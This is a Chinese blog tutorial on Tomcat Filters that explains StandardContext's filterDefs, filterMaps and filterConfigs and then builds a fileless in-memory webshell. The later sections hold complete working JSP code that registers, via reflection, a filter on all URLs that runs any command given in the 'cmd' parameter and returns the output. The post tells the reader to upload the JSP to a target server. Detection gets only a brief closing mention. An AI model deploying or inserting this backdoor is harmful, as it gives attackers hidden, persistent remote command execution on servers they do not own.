---
title: 原理分析 | Filter —— Tomcat 内存马从零到注入
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/a53ac47220f258c36a78197dace351f3-scaled.jpg
categories:
  - - 代码审计
    - 内存马
tags:
  - 代码审计
  - Java
  - Tomcat
  - Filter
  - 内存马
  - RCE
abbrlink: 7b9eb72d
date: 2026-04-09 12:00:00
---

# 原理分析 | Filter —— Tomcat 内存马从零到注入

## 目录

- [一、快速搭建环境](#一快速搭建环境)
- [二、Filter 是什么，正常怎么用](#二filter-是什么正常怎么用)
  - [代码解释](#代码解释)
  - [web.xml 方式注册 Filter](#webxml-方式注册-filter)
  - [两种静态注册方式对比](#两种静态注册方式对比)
- [三、StandardContext 中的三个核心 Filter 集合](#三standardcontext-中的三个核心-filter-集合)
  - [三者的协作流程](#三者的协作流程)
  - [对内存马的关键意义](#对内存马的关键意义)
- [四、动态注册：绕过 web.xml 注入 Filter 内存马](#四动态注册绕过-webxml-注入-filter-内存马)
  - [第一步：拿到 StandardContext](#第一步拿到-standardcontext)
  - [第二步：定义恶意 Filter（匿名内部类）](#第二步定义恶意-filter匿名内部类)
  - [第三步：注册 FilterDef](#第三步注册-filterdef加入档案柜)
  - [第四步：注册 FilterMap](#第四步注册-filtermap加入排班表)
  - [第五步（关键）：强制写入 filterConfigs](#第五步关键强制写入-filterconfigs)
  - [完整注入 JSP 与验证](#完整注入-jsp-与验证)
- [五、总结](#五总结内存马的本质)

---

## 一、快速搭建环境

### 创建项目

先在 IDEA 里快速创建一个 Jakarta EE（原 Java EE）项目。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image1.png)

注意：Jakarta EE 高版本需要高版本的 JDK，这里换成低版本的 Java EE 8 就行。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image2.png)

### 导入 Tomcat 依赖

导入 Tomcat 的本地依赖 `lib/`，把整个 lib 目录加进去（也可以用 Maven 重新下载）。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image3.png)

### 配置热加载

修改配置支持热加载（也可以在 xml 里配置）。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image4.png)

> 如果终端出现中文乱码，可以添加启动参数 `-Dfile.encoding=UTF-8`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image5.png)

### 直接启动

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image6.png)

没有报错，环境搭好了。

---

## 二、Filter 是什么，正常怎么用

先写一个最简单的 Filter 例子，比如"记录每次请求的 IP"。

```java
package org.example.filter;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter("/*")
public class LogFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) {
        System.out.println("LogFilter 初始化");
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        String ip = request.getRemoteAddr();
        System.out.println("请求来自：" + ip);
        // 放行，继续执行后续 Filter 或 Servlet
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {
        System.out.println("LogFilter 销毁");
    }
}
```

启动 web 后随便访问一个网页 `http://localhost:8080/`，控制台输出了一次初始化，每次请求都会多一条记录。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image7.png)

点击红色方框停止服务。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image8.png)

显示 `LogFilter 销毁`。

---

### 代码解释

**`@WebFilter("/*")`**

告诉 Servlet 容器（Tomcat）这是一个过滤器，并且拦截所有 URL 路径（`/*` 表示任意路径）。这样就不需要写 web.xml 配置了。

> **内存马关联**：后面要做的就是**不使用注解，也不写 web.xml，直接通过反射把恶意 Filter 塞进 Tomcat 内部的那个管理结构中**。

---

**`@Override`**

告诉编译器下面的方法是重写接口，不是自己新建的。因为 Filter 接口里已经声明了 `init`、`doFilter`、`destroy` 三个方法（`public class LogFilter implements Filter` 里的 `implements Filter` 就是**实现接口**的意思）。

> **extends 和 implements 的区别**：`继承（extends）` 用于**类与类**之间，子类继承父类的属性和方法；`实现（implements）` 用于**类与接口**之间。

加了 `@Override` 的好处是：如果把 `init` 写成了 `int`，编译器会直接报错，因为 Filter 接口里没有这个方法。不写的话不会报错，照样跑，但可能出现隐蔽的 bug。

---

**`public void init(FilterConfig filterConfig)`**

Tomcat 启动、**第一次加载这个 Filter 类并实例化后**立即调用一次。`FilterConfig` 包含 Filter 的配置信息（例如 web.xml 中设置的初始化参数）。

---

**`public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)`**

**每次有 HTTP 请求匹配到该 Filter 的拦截路径时**，Tomcat 就会调用这个方法。三个参数完全由 `javax.servlet.Filter` 接口规定死了，不能随便改（注意是 `javax.servlet` 包下的）。

---

**`chain.doFilter(request, response)`**

Filter 的完整处理流程：

```
用户请求 → Filter1.doFilter → Filter2.doFilter → ... → Servlet/JSP → 响应
```

`chain` 是一个"过滤器链"对象，管理着当前请求需要经过的所有 Filter 的顺序。

`chain.doFilter(request, response)` 的作用是："当前 Filter 的事情做完了，请把请求和响应交给**下一个环节**继续处理。"

**如果注释掉这一行**，请求就会**卡在当前 Filter 里**，永远到不了后面的环节，浏览器会一直转圈等待或者直接返回空白页面。

---

**`public void destroy()`**

Tomcat **正常关闭或卸载该 Web 应用时**，容器会调用 `destroy` 方法。

**Filter 的生命周期**：

- `init`：Tomcat **启动**、加载 Filter 时调用一次。
- `doFilter`：每次**请求匹配**时调用。
- `destroy`：Tomcat **正常关闭**时调用一次。

---

### web.xml 方式注册 Filter

除了 `@WebFilter("/*")` 这种注解方式，还能通过改 web.xml 文件注册。

在项目的 `src/main/webapp/WEB-INF/web.xml` 的 `<web-app>` 里面添加：

```xml
<!-- 声明 Filter：给 Filter 起个内部名字，并指定它对应的 Java 类 -->
<filter>
    <filter-name>logFilter</filter-name>
    <filter-class>org.example.filter.LogFilter</filter-class>
</filter>
<!-- 映射 Filter：告诉 Tomcat 这个 Filter 要拦截哪些 URL -->
<filter-mapping>
    <filter-name>logFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

效果：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image9.png)

**`<filter>` 部分：**

| 标签 | 含义 | 作用 |
|---|---|---|
| `<filter-name>` | 给这个 Filter 起一个**内部使用的名字** | 可以随便取，只要在这个 web.xml 里唯一即可，但通常用类名的小写形式 |
| `<filter-class>` | 指定这个 Filter 对应的 **Java 类的全限定名** | Tomcat 会根据这个字符串去 WEB-INF/classes 或 lib 目录下找对应的 .class 文件，然后通过反射 `Class.forName()` 加载并实例化它 |

**`<filter-mapping>` 部分：**

| 标签 | 含义 | 作用 |
|---|---|---|
| `<filter-name>` | 关联上面声明的 Filter 名字 | 必须和 `<filter>` 里的 `<filter-name>` **完全一致**，Tomcat 靠这个名字把定义和映射绑定在一起 |
| `<url-pattern>` | 指定拦截的 URL 模式 | `/*` 表示拦截**所有**请求；`/admin/*` 表示只拦截 /admin/ 开头的请求；`*.jsp` 表示拦截所有 .jsp 结尾的请求 |

此时把代码注释后，仍然可以以相同的方式触发 Filter（因为 web.xml 里已经配好了）。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image10.png)

---

### 两种静态注册方式对比

| 注册方式 | 写法 | 特点 |
|---|---|---|
| **注解式** | `@WebFilter("/*")` | 代码即配置，简单直观，Servlet 3.0 引入 |
| **web.xml 式** | 在 WEB-INF/web.xml 中用 XML 声明 | 配置集中，无需修改代码即可调整拦截规则 |

两种方式的效果**完全一样**，都是让 Tomcat 在启动时把 Filter 注册到 StandardContext 里。

不过以上都是**静态注册**，也就是在启动前就写死在代码里的。接下来才是重点——动态注入。

---

## 三、StandardContext 中的三个核心 Filter 集合

在讲动态注入之前，需要先搞清楚 StandardContext 内部的结构。

StandardContext 作为 Web 应用的容器总管，内部维护了三个直接决定 Filter 如何工作的关键成员变量：

```java
private HashMap<String, FilterDef> filterDefs = new HashMap<>();          // 1. 定义集合
private FilterMap[] filterMaps = new FilterMap[0];                         // 2. 路由数组
private HashMap<String, ApplicationFilterConfig> filterConfigs = new HashMap<>();  // 3. 运行时配置集合
```

### 1. filterDefs —— Filter 定义库

- **类型**：`HashMap<String, FilterDef>`
- **存储内容**：以 Filter 的内部名称（如 `"logFilter"`）为键，以对应的 FilterDef 对象为值。
- **作用**：保存应用中所有已声明的 Filter 的**元数据定义**，包括名字、类名、实例引用等。
- **何时填充**：Tomcat **启动阶段**解析 web.xml 或扫描 @WebFilter 注解时，每发现一个 Filter 就创建一个 FilterDef 并存入此 Map。

### 2. filterMaps —— Filter 路由表

- **类型**：`FilterMap[]`
- **存储内容**：数组中的每个 FilterMap 对象描述了一个 Filter 与 URL 模式（或 Servlet 名称）的映射关系。
- **作用**：决定**哪些请求路径需要经过哪些 Filter**，以及多个 Filter 之间的执行顺序。
- **何时填充**：同样在**启动阶段**解析 `<filter-mapping>` 或注解的 urlPatterns 属性时构建并加入数组。

### 3. filterConfigs —— 运行时配置缓存

- **类型**：`HashMap<String, ApplicationFilterConfig>`
- **存储内容**：以 Filter 名称为键，以 ApplicationFilterConfig 对象为值。
- **作用**：缓存 Filter 的**运行时完整配置**。ApplicationFilterConfig 内部封装了 FilterDef 和 Filter 实例，Tomcat 在执行过滤链时，会从此处取出对应的 ApplicationFilterConfig，再通过它拿到 Filter 实例并调用 doFilter 方法。
- **何时填充**：**懒加载**。并非启动时立即填充，而是在**某个 Filter 第一次被请求匹配到时**，Tomcat 才会根据 filterDefs 中的定义创建对应的 ApplicationFilterConfig 对象，并放入 filterConfigs 缓存起来，后续请求直接复用。

---

### 三者的协作流程

1. **请求到达** → Tomcat 遍历 filterMaps，找出所有匹配当前 URL 的 Filter 名称。
2. 对每个名称，去 filterConfigs 中查找是否已有 ApplicationFilterConfig：
   - **有** → 直接取出使用。
   - **无** → 去 filterDefs 中找到对应的 FilterDef，据此创建 ApplicationFilterConfig 对象，存入 filterConfigs，然后使用。
3. 依次调用各 Filter 实例的 doFilter 方法，形成过滤链。

---

### 对内存马的关键意义

正常 Filter 的 filterDefs 和 filterMaps 在**启动时**由容器自动填充，filterConfigs 则在**首次请求时**按需创建。

而内存马是在**运行时动态注入**的，此时启动阶段早已结束。如果只添加了 FilterDef 和 FilterMap，当请求匹配到恶意 Filter 时，Tomcat 会尝试懒加载创建 ApplicationFilterConfig，但由于运行时的一些状态检查（例如 `context.getState().isAvailable()` 等），动态创建可能会失败，最终导致 `No filter configuration found` 的警告，Filter 无法生效。

**所以内存马必须手动强制把 ApplicationFilterConfig 塞进 filterConfigs**，这就是第五步存在的原因。

---

## 四、动态注册：绕过 web.xml 注入 Filter 内存马

目标是在运行时完成以下五步：

1. 拿到当前 Web 应用的 StandardContext 对象。
2. 手动构造恶意 Filter 的实例。
3. 将恶意 Filter 的 FilterDef 加入 filterDefs。
4. 创建 FilterMap 并加入 filterMaps 数组。
5. **（关键）** 强制构造 ApplicationFilterConfig 并塞入 filterConfigs。

---

### 第一步：拿到 StandardContext（反射挖掘）

在 JSP 中我们只能拿到 `ServletContext` 接口，因为 Tomcat 把 StandardContext 锁住了，只留下了 ServletContext 接口。但是我们需要的三个方法是 StandardContext 里的，ServletContext 没有。

因此必须通过反射，**向下挖两层**，才能拿到 StandardContext 实例。

> `<% %>` 是 JSP 中的**脚本段（Scriptlet）**，里面的内容会被当作 **Java 代码**执行。

```java
<%
// 通过 request（内置对象）获取当前 Web 应用的 ServletContext
// 接口变量 servletContext 的实际类型是 org.apache.catalina.core.ApplicationContextFacade
ServletContext servletContext = request.getSession().getServletContext();

// 1. 反射获取 ApplicationContextFacade 中的 ApplicationContext
Field appContextField = servletContext.getClass().getDeclaredField("context");
// 突破限制，强行读取私有字段
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);

// 2. 反射获取 ApplicationContext 中的 StandardContext
Field stdContextField = applicationContext.getClass().getDeclaredField("context");
stdContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) stdContextField.get(applicationContext);
%>
```

层级关系如下：

```
JSP 能拿到的对象：ServletContext 接口
  ↓（实际类型是 ApplicationContextFacade）
  ↓（反射获取其私有字段 "context"）
  ↓
第一层：ApplicationContext 对象
  ↓（反射获取其私有字段 "context"）
  ↓
第二层：StandardContext 对象  ← 目标
```

由于这些字段都是私有的，必须使用 `setAccessible(true)` 突破访问限制，**必须两层反射**。

---

### 第二步：定义恶意 Filter（匿名内部类）

直接在 JSP 中实现 `javax.servlet.Filter` 接口，创建一个内存中的恶意 Filter 实例。

| 写法 | 代码 | 使用场景 |
|---|---|---|
| **独立类** | `public class LogFilter implements Filter { ... }` | 正规开发，代码需编译成 .class 文件，部署在 WEB-INF/classes 中 |
| **匿名内部类** | `Filter f = new Filter() { ... };` | 运行时动态生成，**无需单独文件**，直接在内存中创建实例 |

```java
<%
// 匿名内部类
Filter maliciousFilter = new Filter() {
    @Override
    // 必须实现的方法，但内存马不需要初始化操作，所以留空
    public void init(FilterConfig filterConfig) {}

    @Override
    // 这是 Filter 的核心拦截方法，每次请求匹配到该 Filter 时被 Tomcat 调用
    // 参数 request、response、chain 由 Tomcat 传入，固定不变
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        // 获取 URL 中 ?cmd=xxx 的参数值，如果没有该参数，返回 null
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            // 调用操作系统的命令行执行器，执行传入的 cmd 字符串
            Process process = Runtime.getRuntime().exec(cmd);

            // 读取命令执行结果的输出流（Java 8 写法）
            // Java 9+ 写法：byte[] bytes = process.getInputStream().readAllBytes();
            java.io.InputStream inputStream = process.getInputStream();
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = inputStream.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }
            byte[] bytes = baos.toByteArray();

            // 将结果写回浏览器
            // Windows 下中文回显乱码问题通过 new String(bytes, "GBK") 解决
            response.getWriter().write(new String(bytes, "GBK"));
            // 执行完命令回显后，直接 return，没有调用 chain.doFilter
            // 请求链在这里被截断，后续的任何 Filter 和目标 Servlet/JSP 都不会执行
            return;
        }
        // 如果 cmd == null（没有后门参数），则执行这一行，保证正常业务不受影响
        chain.doFilter(request, response);
    }

    @Override
    // 必须实现的清理方法，内存马不需要释放资源，留空
    public void destroy() {}
};
%>
```

**总结**：
- 使用匿名内部类快速实现 Filter 接口，无需单独编写 .java 文件。
- doFilter 中判断参数 cmd 是否存在，存在则执行系统命令并回显，然后直接 return 截断请求链。
- 没有 cmd 参数时正常放行，保证正常业务不受影响。
- Windows 下中文回显乱码问题通过 `new String(bytes, "GBK")` 解决。

---

### 第三步：注册 FilterDef（加入档案柜）

```java
<%
// 创建一个对象用来放内存马 maliciousFilter 的信息
FilterDef filterDef = new FilterDef();

filterDef.setFilterName("evil");
// 取名字，相当于 web.xml 中的 <filter-name>，后面 FilterMap 会用这个名字来关联

filterDef.setFilterClass(maliciousFilter.getClass().getName());
// 设置 Filter 的全限定类名，对应 web.xml 中的 <filter-class>，不过用的是反射的方法取得

filterDef.setFilter(maliciousFilter);
// 设置我们写的这个内存马对象

standardContext.addFilterDef(filterDef);
// 调用 StandardContext 自带的方法，addFilterDef 把这份信息放入 filterDefs 这个 Map 中
%>
```

**对应关系**（这一步等价于 web.xml 中的 `<filter>` 声明）：

| 正常注册（web.xml） | 内存马动态注册 |
|---|---|
| `<filter-name>evil</filter-name>` | `filterDef.setFilterName("evil")` |
| `<filter-class>com.example.EvilFilter</filter-class>` | `filterDef.setFilterClass(...)` |
| Tomcat 根据类名反射创建实例 | `filterDef.setFilter(maliciousFilter)` 直接塞入已有实例 |
| Tomcat 自动调用 addFilterDef | 我们手动调用 `standardContext.addFilterDef(filterDef)` |

至此，恶意 Filter 的定义已经进入了 StandardContext 的 filterDefs 集合中，但 Tomcat 还不知道这个 Filter 要拦截哪些 URL，也没有准备好运行时配置。接下来的两步会补齐这两个缺口。

---

### 第四步：注册 FilterMap（加入排班表）

```java
<%
// FilterDef、FilterMap 这些都是普通的类，可以正常地直接创建
FilterMap filterMap = new FilterMap();

filterMap.setFilterName("evil");
// 名字需要和前面的身份信息一致才能匹配

filterMap.addURLPattern("/*");
// 设置拦截规则：拦截所有 URL 路径，相当于 web.xml 中的 <url-pattern>/*</url-pattern>

standardContext.addFilterMapBefore(filterMap);
// 把这个规则添加到 standardContext 里的最前面
%>
```

**对应 web.xml**：

| web.xml 配置 | 内存马代码 |
|---|---|
| `<filter-mapping>` | `FilterMap filterMap = new FilterMap();` |
| `<filter-name>evil</filter-name>` | `filterMap.setFilterName("evil");` |
| `<url-pattern>/*</url-pattern>` | `filterMap.addURLPattern("/*");` |
| （自动按顺序加入） | `standardContext.addFilterMapBefore(filterMap);` |

**为什么用 `addFilterMapBefore` 而不是 `addFilterMap`？**

`addFilterMapBefore` 会将映射添加到数组**最前面**，确保恶意 Filter 优先执行。内存马选择插在开头是为了**优先拦截请求**，确保无论后面还有哪些合法 Filter，恶意 Filter 都会第一个执行，从而保证 `?cmd` 参数能被率先捕获。

---

### 第五步（关键）：强制写入 filterConfigs

由于我们错过了 Tomcat 的启动阶段，必须手动将 ApplicationFilterConfig 塞入 filterConfigs，否则请求到来时会因找不到配置而失效。

```java
<%
// 反射获取 filterConfigs 字段
// filterConfigs 是 StandardContext 内部的一个 private 字段，没有提供公开的 getter 方法
// 正常情况下，外部代码根本无法访问它，所以必须用反射

Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
filterConfigsField.setAccessible(true);
HashMap<String, ApplicationFilterConfig> filterConfigs = 
    (HashMap<String, ApplicationFilterConfig>) filterConfigsField.get(standardContext);

// 创建 ApplicationFilterConfig 对象
// 构造函数需要两个参数：StandardContext 和 FilterDef
Constructor<?> constructor = ApplicationFilterConfig.class
    .getDeclaredConstructor(StandardContext.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = 
    (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

// 将创建好的 filterConfig 放入 filterConfigs 这个 Map 中
filterConfigs.put("evil", filterConfig);
%>
```

**为什么必须手动创建 ApplicationFilterConfig？**

正常流程中，Tomcat 在第一次请求匹配到 Filter 时会自动创建 ApplicationFilterConfig。但内存马注入时，Tomcat 已经启动完毕，处于运行状态。如果只添加了 FilterDef 和 FilterMap，当请求到来时：

1. Tomcat 遍历 filterMaps 找到 "evil"
2. 去 filterConfigs 中查找，发现没有
3. 尝试根据 filterDefs 创建 ApplicationFilterConfig
4. **但在创建过程中会检查 context 状态**，可能因为状态不满足条件而失败
5. 最终导致 Filter 无法生效

所以必须手动创建并塞入 filterConfigs，绕过 Tomcat 的状态检查。

---

### 完整注入 JSP 与验证

将以上五步整合成一个完整的 JSP 文件：

```jsp
<%@ page import="javax.servlet.*" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.io.IOException" %>

<%
// 第一步：获取 StandardContext
ServletContext servletContext = request.getSession().getServletContext();
Field appContextField = servletContext.getClass().getDeclaredField("context");
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
Field stdContextField = applicationContext.getClass().getDeclaredField("context");
stdContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) stdContextField.get(applicationContext);

// 第二步：定义恶意 Filter
Filter maliciousFilter = new Filter() {
    @Override
    public void init(FilterConfig filterConfig) {}

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.InputStream inputStream = process.getInputStream();
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = inputStream.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }
            byte[] bytes = baos.toByteArray();
            response.getWriter().write(new String(bytes, "GBK"));
            return;
        }
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {}
};

// 第三步：注册 FilterDef
FilterDef filterDef = new FilterDef();
filterDef.setFilterName("evil");
filterDef.setFilterClass(maliciousFilter.getClass().getName());
filterDef.setFilter(maliciousFilter);
standardContext.addFilterDef(filterDef);

// 第四步：注册 FilterMap
FilterMap filterMap = new FilterMap();
filterMap.setFilterName("evil");
filterMap.addURLPattern("/*");
standardContext.addFilterMapBefore(filterMap);

// 第五步：强制写入 filterConfigs
Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
filterConfigsField.setAccessible(true);
HashMap<String, ApplicationFilterConfig> filterConfigs = 
    (HashMap<String, ApplicationFilterConfig>) filterConfigsField.get(standardContext);
Constructor<?> constructor = ApplicationFilterConfig.class
    .getDeclaredConstructor(StandardContext.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = 
    (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
filterConfigs.put("evil", filterConfig);

out.println("Filter 内存马注入成功！");
%>
```

**验证步骤**：

1. 将上述 JSP 文件上传到目标服务器的 Web 目录（如 `webapps/ROOT/`）
2. 访问该 JSP 文件，看到 "Filter 内存马注入成功！"
3. 访问任意页面并带上 `?cmd=whoami` 参数，例如：
   ```
   http://localhost:8080/?cmd=whoami
   ```
4. 如果成功，页面会显示命令执行结果

---

## 五、总结：内存马的本质

**内存马的核心思想**：

- **不落地**：不写入文件系统，只存在于 JVM 内存中
- **动态注册**：绕过 web.xml 和注解，直接操作 Tomcat 内部数据结构
- **隐蔽持久**：只要 Tomcat 不重启，内存马就一直存在

**Filter 内存马的关键点**：

1. 必须拿到 StandardContext 对象（通过反射）
2. 必须同时注入三个数据结构：filterDefs、filterMaps、filterConfigs
3. 必须手动创建 ApplicationFilterConfig（因为错过了启动阶段）
4. 使用 `addFilterMapBefore` 确保优先拦截

**防御检测**：

从防御视角来看，检测内存马通常需要扫描 JVM 内存中的 Filter 列表，对比是否存在未在 web.xml 或注解中声明的 Filter，或者利用 Java Agent 在运行时对 Tomcat 内部数据结构的修改进行监控。
